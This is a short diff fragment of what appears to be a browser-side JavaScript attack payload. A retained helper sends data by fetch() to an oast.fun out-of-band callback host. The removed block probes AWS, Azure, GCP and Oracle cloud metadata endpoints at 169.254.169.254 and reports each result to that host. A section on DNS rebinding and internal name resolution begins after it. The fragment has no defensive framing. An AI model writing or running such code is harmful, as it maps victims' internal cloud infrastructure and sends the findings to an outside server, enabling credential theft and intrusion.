@@ -14,21 +14,6 @@
     fetch('https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/' + path + '?d=' + encodeURIComponent(data));
   };
 
-  // === [1] Metadata Endpoint Probing ===
-  const metadataTargets = [
-    'http://169.254.169.254/latest/meta-data/', // AWS
-    'http://169.254.169.254/metadata/instance?api-version=2021-02-01', // Azure
-    'http://169.254.169.254/computeMetadata/v1/', // GCP
-    'http://169.254.169.254/opc/v1/', // Oracle
-  ];
-
-  metadataTargets.forEach(url => {
-    const img = new Image();
-    img.src = url;
-    img.onload = () => exfil('metadata_hit', url);
-    img.onerror = () => exfil('metadata_miss', url);
-  });
-
   // === [2] DNS Rebinding / Internal Resolution Test ===
   const internalDnsNames = [
     'internal-service.local',
